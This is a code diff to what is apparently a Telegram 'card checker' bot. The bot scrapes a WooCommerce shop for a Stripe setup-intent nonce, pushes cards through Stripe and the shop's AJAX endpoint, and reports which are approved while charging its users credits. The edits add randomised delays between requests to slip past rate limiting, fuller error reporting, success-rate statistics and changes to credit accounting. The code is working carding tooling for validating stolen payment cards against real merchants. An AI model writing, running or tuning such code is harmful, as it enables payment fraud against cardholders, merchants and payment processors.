@@ -163,6 +163,7 @@ BILLING_ADDRESSES = {
 db_pool = None
 
 def parseX(data, start, end):
+    """Extract text between start and end strings"""
     try:
         if not data or not start or not end:
             return None
@@ -618,8 +619,8 @@ async def get_setup_intent():
     
     current_time = time.time()
     
-    # Check cache (5 minutes)
-    if "nonce" in setup_intent_cache and current_time - last_cache_time < 300:
+    # Check cache (3 minutes instead of 5 for freshness)
+    if "nonce" in setup_intent_cache and current_time - last_cache_time < 180:
         return setup_intent_cache["nonce"], setup_intent_cache["session"]
     
     # Get fresh setup intent
@@ -640,7 +641,7 @@ async def get_setup_intent():
                 html = await response.text()
                 nonce = parseX(html, '"createAndConfirmSetupIntentNonce":"', '"')
                 
-                if nonce and len(nonce) > 10:
+                if nonce and len(nonce) > 10 and nonce != "None":
                     setup_intent_cache = {
                         "nonce": nonce,
                         "session": session,
@@ -648,6 +649,8 @@ async def get_setup_intent():
                     }
                     last_cache_time = current_time
                     return nonce, session
+                else:
+                    return None, None
     
     except Exception as e:
         logger.error(f"Error getting setup intent: {e}")
@@ -968,7 +971,7 @@ async def check_single_card_fast(card):
         except asyncio.TimeoutError:
             return card, "declined", "❌ Stripe Timeout", 0
         except Exception as e:
-            return card, "declined", f"❌ Network Error", 0
+            return card, "declined", f"❌ Network Error: {str(e)[:30]}", 0
         
         try:
             pm_data = json.loads(req1)
@@ -993,6 +996,9 @@ async def check_single_card_fast(card):
                 return card, "declined", "❌ No Payment ID", 0
         except json.JSONDecodeError:
             return card, "declined", "❌ Invalid Response", 0
+        
+        # Small delay before next request
+        await asyncio.sleep(random.uniform(0.3, 0.8))
         
         # Step 2: Send to WooCommerce (FAST)
         headers2 = {
@@ -1020,8 +1026,8 @@ async def check_single_card_fast(card):
                     return card, "declined", f"❌ Server Error {response.status}", response.status
         except asyncio.TimeoutError:
             return card, "declined", "❌ AJAX Timeout", 0
-        except Exception:
-            return card, "declined", "❌ AJAX Error", 0
+        except Exception as e:
+            return card, "declined", f"❌ AJAX Error: {str(e)[:30]}", 0
         
         try:
             result_data = json.loads(req2)
@@ -1038,6 +1044,8 @@ async def check_single_card_fast(card):
                                 # Check if this is an actual card decline
                                 if any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient']):
                                     return card, "declined", f"❌ Card: {error_msg[:30]}", 0
+                    elif 'message' in result_data:
+                        error_msg = result_data.get('message', 'Declined')
                 # If we get here, it's a general decline/error
                 return card, "declined", f"❌ {error_msg[:30]}", 0
         except json.JSONDecodeError:
@@ -2362,7 +2370,7 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                 except Exception:
                     pass
             
-            # Check single card
+            # Check single card using your existing function
             result_card, status, message, http_code = await check_single_card_fast(card)
             
             processed += 1
@@ -2380,10 +2388,10 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
             error_keywords = [
                 'setup error', 'timeout', 'http error', 'network error', 
                 'connection error', 'server error', 'internal error',
-                'invalid response', 'no payment id', 'ajax error'
+                'invalid response', 'no payment id', 'ajax error', 'stripe timeout'
             ]
             
-            message_lower = message.lower()
+            message_lower = message.lower() if message else ""
             is_actual_decline = any(keyword in message_lower for keyword in actual_decline_keywords)
             is_error = any(keyword in message_lower for keyword in error_keywords)
             
@@ -2395,14 +2403,28 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                 
                 # Send approved result
                 try:
-                    result_text = format_card_result(result_card, status, message, None, None, None)
+                    # Get updated user info for the result
+                    current_user = await get_user(user_id)
+                    result_text = format_card_result(
+                        result_card, 
+                        status, 
+                        message,
+                        current_user.get("credits", 0),
+                        {
+                            "approved": approved,
+                            "declined": declined,
+                            "total_approved": current_user.get("approved_cards", 0),
+                            "total_declined": current_user.get("declined_cards", 0)
+                        }
+                    )
                     await context.bot.send_message(
                         chat_id=chat_id,
                         text=result_text,
                         parse_mode=ParseMode.HTML
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.error(f"Error sending approved result: {e}")
+                    
             elif status == "declined" and is_actual_decline and not is_error:
                 declined += 1
                 credits_used += 1  # Deduct credit for actual decline
@@ -2414,9 +2436,10 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
                 if user_id in checking_tasks:
                     checking_tasks[user_id]["declined"] = declined
             
-            # Small delay to avoid rate limiting
+            # Small delay to avoid rate limiting (tuned for speed)
             if i < len(cards) - 1:
-                await asyncio.sleep(0.2)
+                delay = random.uniform(0.5, 1.5)
+                await asyncio.sleep(delay)
         
         # Close session
         await session.close()
@@ -2460,6 +2483,7 @@ async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id, context
 • ❌ Declined: {declined}
 • Credits Used: {credits_used} (only for actual checks)
 • Time Taken: {elapsed:.1f}s
+• Success Rate: {success_rate:.1f}%
 
 <b>Your Balance:</b> {user.get('credits', 0)} credits
 ══════════════════════
@@ -2496,13 +2520,13 @@ async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TY
         if user_id in checking_tasks:
             checking_tasks[user_id]["cancelled"] = True
             
-            # Calculate used credits
+            # Calculate used credits based on actual processing
             processed = checking_tasks[user_id]["cards_processed"]
             approved = checking_tasks[user_id].get("approved", 0)
             declined = checking_tasks[user_id].get("declined", 0)
             
             user = await get_user(user_id)
-            used_credits = processed
+            used_credits = approved + declined  # Only actual checks count
             
             # Update user credits
             updates = {
@@ -2512,20 +2536,22 @@ async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TY
                 'total_checks': user["total_checks"] + processed,
                 'approved_cards': user.get("approved_cards", 0) + approved,
                 'declined_cards': user.get("declined_cards", 0) + declined,
-                'last_check_date': datetime.datetime.now().date()
+                'last_check_date': datetime.datetime.now().date().isoformat()
             }
             await update_user(user_id, updates)
             
             # Update bot statistics
             await update_bot_stats({
                 'total_checks': processed,
-                'total_credits_used': processed,
+                'total_credits_used': used_credits,
                 'total_approved': approved,
                 'total_declined': declined
             })
             
             # Refresh user data
             user = await get_user(user_id)
+            
+            success_rate = (approved / processed * 100) if processed > 0 else 0
             
             await query.edit_message_text(
                 f"*🛑 CHECK CANCELLED*\n"
@@ -2534,7 +2560,8 @@ async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TY
                 f"• Processed: {processed} cards\n"
                 f"• ✅ Approved: {approved}\n"
                 f"• ❌ Declined: {declined}\n"
-                f"• Credits Used: {used_credits}\n\n"
+                f"• Credits Used: {used_credits}\n"
+                f"• Success Rate: {success_rate:.1f}%\n\n"
                 f"*New Balance:* {user['credits']} credits",
                 parse_mode=ParseMode.MARKDOWN
             )
